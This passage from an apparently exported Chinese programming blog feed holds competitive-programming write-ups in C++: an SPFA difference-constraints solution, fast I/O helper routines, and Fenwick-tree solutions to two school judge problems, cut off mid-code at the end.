<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Point;</span><br><span class="line">    <span class="keyword">int</span> Next;</span><br><span class="line">    <span class="keyword">int</span> Value;</span><br><span class="line">&#125;a[<span class="number">2000000</span>];</span><br><span class="line"><span class="keyword">int</span> n,m,x,y,z,len,head,tail,Queue[<span class="number">200000</span>];</span><br><span class="line"><span class="keyword">int</span> Link[<span class="number">200000</span>],Candy[<span class="number">200000</span>],dis[<span class="number">200000</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans;</span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">200000</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">In</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">0</span>,F=<span class="number">1</span>; <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch&lt;<span class="string">&#x27;0&#x27;</span>||ch&gt;<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123; <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=-F; ch=getchar();&#125;</span><br><span class="line">    <span class="keyword">while</span>(ch&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123; This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;ch=getchar();&#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++len].Point=y;</span><br><span class="line">    a[len].Next=Link[x];</span><br><span class="line">    a[len].Value=v;</span><br><span class="line">    Link[x]=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SPFA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Queue[++tail]=<span class="number">0</span>;</span><br><span class="line">    vis[<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line">    dis[<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span>(++head&lt;=tail)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;Queue[head]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[Queue[head]];i;i=a[i].Next)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> This=a[i].Point;</span><br><span class="line">            <span class="keyword">if</span>(Candy[This]&lt;Candy[Queue[head]]+a[i].Value)</span><br><span class="line">            &#123;</span><br><span class="line">                Candy[This]=Candy[Queue[head]]+a[i].Value;</span><br><span class="line">                <span class="keyword">if</span>(++dis[This]&gt;=n) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">if</span>(vis[This]==<span class="literal">false</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    Queue[++tail]=This;</span><br><span class="line">                    vis[This]=<span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vis[Queue[head]]=<span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=In(); m=In();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        z=In(); x=In(); y=In();</span><br><span class="line">        <span class="keyword">if</span>(z==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Init(x,y,<span class="number">0</span>);</span><br><span class="line">            Init(y,x,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(z==<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(x==y)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="number">-1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Init(x,y,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(z==<span class="number">3</span>) Init(y,x,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(z==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(x==y)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="number">-1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Init(y,x,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(z==<span class="number">5</span>) Init(x,y,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i;i--) Init(<span class="number">0</span>,i,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(!SPFA()) <span class="built_in">cout</span>&lt;&lt;<span class="number">-1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        ans+=Candy[i];</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>图论</tag>
      </tags>
  </entry>
  <entry>
    <title>快速输入和输出</title>
    <url>/2017/05/20/a01205b4461f/</url>
    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><blockquote>
<p>今天晚上闲来无事，就将各种类型的快读和快出写了出来（不会写浮点型）；</p>
</blockquote>
<h2 id="读入int"><a href="#读入int" class="headerlink" title="读入int"></a>读入int</h2><p>比如int是节省时间最快的，超级快！！！</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">In_int</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">0</span>,F=<span class="number">1</span>; <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch&lt;<span class="string">&#x27;0&#x27;</span>||ch&gt;<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=-F;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(ch&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="读入char"><a href="#读入char" class="headerlink" title="读入char"></a>读入char</h2><p>其次就是char类型，节省时间一般般。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">char</span> <span class="title">In_char</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch&lt;<span class="string">&#x27;A&#x27;</span>||ch&gt;<span class="string">&#x27;z&#x27;</span>) ch=getchar();</span><br><span class="line">    <span class="keyword">return</span> ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="读入string"><a href="#读入string" class="headerlink" title="读入string"></a>读入string</h2><p>然后就是cstring类型的，发现并没有多大提升，一样慢的要死。(可能我的用getchar没有办法进行特别强大的优化)</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="built_in">string</span> <span class="title">In_string</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> s1; <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch&lt;<span class="string">&#x27;!&#x27;</span>||ch&gt;<span class="string">&#x27;~&#x27;</span>) ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch&gt;=<span class="string">&#x27;!&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;~&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        s1+=ch;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="输出char："><a href="#输出char：" class="headerlink" title="输出char："></a>输出char：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Put_char</span><span class="params">(<span class="keyword">char</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">putchar</span>(x);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="输出string："><a href="#输出string：" class="headerlink" title="输出string："></a>输出string：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Put_string</span><span class="params">(<span class="built_in">string</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;x.size();i++) <span class="built_in">putchar</span>(x[i]);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="输出int："><a href="#输出int：" class="headerlink" title="输出int："></a>输出int：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Put_int</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">10</span>,len=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(This&lt;=x)</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>);</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(len--)</span><br><span class="line">    &#123;</span><br><span class="line">        This/=<span class="number">10</span>;</span><br><span class="line">        <span class="built_in">putchar</span>(x/This+<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        x%=This;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>IO</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉索引树(树状数组)——题解</title>
    <url>/2017/05/20/735d98fe9eae/</url>
    <content><![CDATA[<h1 id="P1993-树状数组-种树"><a href="#P1993-树状数组-种树" class="headerlink" title="P1993[树状数组]种树"></a>P1993[树状数组]种树</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>Jzyz的机房的新规定明确说明，机房高一最强的人要接受惩罚，于是杨树辰就被罚去植树了。我们把jzyz对面的一条路看成一条长度为n的线，晗神给杨树神指定了一些区间让他种树，美其名曰让他减肥，但是晗神在中间会来检查杨树神的工作，询问杨树神一个点上有几棵树，但是杨树神不仅代码敲得贼好，而且眼神非常好，但是作为大佬的杨树神想考考你，并让你设计一个程序来帮他完成晗神的检查。</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><ol>
<li>第一行：n和m。</li>
<li>第2到 m+1行：每行开头一个z Z=1，后跟两个整数L和R表示种树的区间L,R，0&lt;=L&lt;=R&lt;=n. Z=2，后跟一个整数x，表示询问的地点的树的个数,0&lt;=x&lt;=n.</li>
</ol>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>对于每个z==2的答案。1&lt;=n,m&lt;=1000000;</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这里是运用到了树状数组的区间操作，我们对于修改一个区间的元素已经很清楚了，只需要将所有的数组都加上就好了，那么检查的时候我们就需要将左端点到1种上-1棵树，然后右端点到1种上1棵树，这样的话我们就可以对于一个区间进行修改了。</p>
<p>但是恶意卡快读快输就不对了啊……</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,z,x,y,k,c[<span class="number">1000002</span>];</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1</span>&lt;&lt;<span class="number">15</span>],*fs,*ft;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">char</span> <span class="title">getc</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> (fs==ft&amp;&amp;(ft=(fs=buf)+fread(buf,<span class="number">1</span>,<span class="number">1</span>&lt;&lt;<span class="number">15</span>,<span class="built_in">stdin</span>),fs==ft))?<span class="number">0</span>:*fs++;&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">In</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">0</span>,F=<span class="number">1</span>; <span class="keyword">char</span> ch=getc();</span><br><span class="line">    <span class="keyword">while</span>(ch&lt;<span class="string">&#x27;0&#x27;</span>||ch&gt;<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getc();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(ch&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getc();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">        x=-x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">0</span>;<span class="keyword">char</span> ch[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">while</span>(x) ch[++num]=x%<span class="number">10</span>+<span class="string">&#x27;0&#x27;</span>,x/=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">while</span>(num) <span class="built_in">putchar</span>(ch[num--]);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">Lowbit</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> x&amp;(-x); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Sum</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x&gt;=<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ans+=c[x];</span><br><span class="line">        x-=Lowbit(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Plus</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> add)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(x&lt;=n)</span><br><span class="line">    &#123;</span><br><span class="line">        c[x]+=add;</span><br><span class="line">        x+=Lowbit(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=In()+<span class="number">1</span>; m=In();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    <span class="keyword">if</span>(z=In()==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x=In()+<span class="number">1</span>; y=In()+<span class="number">1</span>;</span><br><span class="line">        Plus(x,<span class="number">1</span>);</span><br><span class="line">        Plus(y+<span class="number">1</span>,<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> put(Sum(k=In()+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="P1994-树状数组-尧神追MM"><a href="#P1994-树状数组-尧神追MM" class="headerlink" title="P1994 [树状数组]尧神追MM"></a>P1994 [树状数组]尧神追MM</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p><strong>Jzyz</strong>的机房中都是<strong>dalao</strong>，其中最会追MM的就是尧神。有一天尧神发现了n个MM，尧神非常开心，想让他们都成为自己的GF，但是他又怕有太多的GF会得不偿失（其实就是怕原配生气），于是他决定只从这n个MM中找5个作为自己的GF。每个MM都有自己的魅力值（1&lt;=魅力值&lt;=50000），尧神希望自己找的这5个MM的魅力值严格递增，他的原配想要请你设计个程序计算尧神找GF的方案数（因为这是他晚上回去要跪键盘的时间）。</p>
</blockquote>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><ol>
<li>第一行：一个整数n（1&lt;=n&lt;=50000）<br></li>
<li>第二行：n个整数，表示n个MM的魅力值。</li>
</ol>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输入仅包含一行，表示方案数</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><p>这道题啊，超级厉害啊，各种坑挖的，什么无符号 <code>longlong</code>，什么坐标为0。</p>
<p>首先，你需要声明一个 <code>unsigned long long</code> 才不会被爆掉，然后记得每个坐标都加上一个1，因为数据里面是有位0的，而树状数组里面是不能为零的，不然会无线循环，<code>Lowbit(0)=0</code> 然后就不停地加或者减无法退出。</p>
<p>因为题目上让尧神留下来5个MM，所以我们就可以开五个树状数组来记录下来元素能严格递增并且长度达到第i个树状数组的方案数，更新的步骤是这样的，将第i个数加入第一个树状数组里面，统计小于第i个数的个数，如果然后加到下一个树状数组里面这样每次循环4次。</p>
<p>最后输出第五个树状数组所有元素之和就好了。</p>
<p>树神的PPT简直业界良心啊！</p>
<p><img src="https://xorex.space/image/023.png"></p>
<p><img src="https://xorex.space/image/024.png"></p>
<p><img src="https://xorex.space/image/025.png"></p>
<p><img src="https://xorex.space/image/026.png"></p>
<p><img src="https://xorex.space/image/027.png"></p>
<p><img src="https://xorex.space/image/028.png"></p>
<p><img src="https://xorex.space/image/029.png"></p>
<p><img src="https://xorex.space/image/030.png"></p>
<p><img src="https://xorex.space/image/031.png"></p>
<p><img src="https://xorex.space/image/032.png"></p>
<p><img src="https://xorex.space/image/033.png"></p>
<p><img src="https://xorex.space/image/034.png"></p>
<p><img src="https://xorex.space/image/035.png"></p>
<p><img src="https://xorex.space/image/036.png"></p>
<p><img src="https://xorex.space/image/037.png"></p>
<p><img src="https://xorex.space/image/038.png"></p>
<p><img src="https://xorex.space/image/039.png"></p>
<p>相信你看了上面的过程也一定理解了这道题了，刚刚传的时候顺序是乱的，结果我就当场来了一遍快速排序QAQ……</p>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> c1[<span class="number">60000</span>],c2[<span class="number">60000</span>],c3[<span class="number">60000</span>],n;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> c4[<span class="number">60000</span>],c5[<span class="number">60000</span>],maxx,a[<span class="number">60000</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">In</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> This=<span class="number">0</span>,F=<span class="number">1</span>; <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch&lt;<span class="string">&#x27;0&#x27;</span>||ch&gt;<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(ch&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">Lowbit</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> x&amp;(-x); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Plus</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> x,<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> add,<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(x&lt;=maxx)</span><br><span class="line">        &#123;</span><br><span class="line">            c1[x]+=add;</span><br><span class="line">            x+=Lowbit(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(num==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(x&lt;=maxx)</span><br><span class="line">        &#123;</span><br><span class="line">            c2[x]+=add;</span><br><span class="line">            x+=Lowbit(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(num==<span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(x&lt;=maxx)</span><br><span class="line">        &#123;</span><br><span class="line">            c3[x]+=add;</span><br><span class="line">            x+=Lowbit(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(num==<span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(x&lt;=maxx)</span><br><span class="line">        &#123;</span><br><span class="line">            c4[x]+=add;</span><br><span class="line">            x+=Lowbit(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(num==<span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(x&lt;=maxx)</span><br><span class="line">        &#123;</span><br><span class="line">            c5[x]+=add;</span><br><span class="line">            x+=Lowbit(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">Sum</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> x,<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x&gt;=<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ans+=c1[x];</span><br><span class="line">            x-=Lowbit(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(num==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span 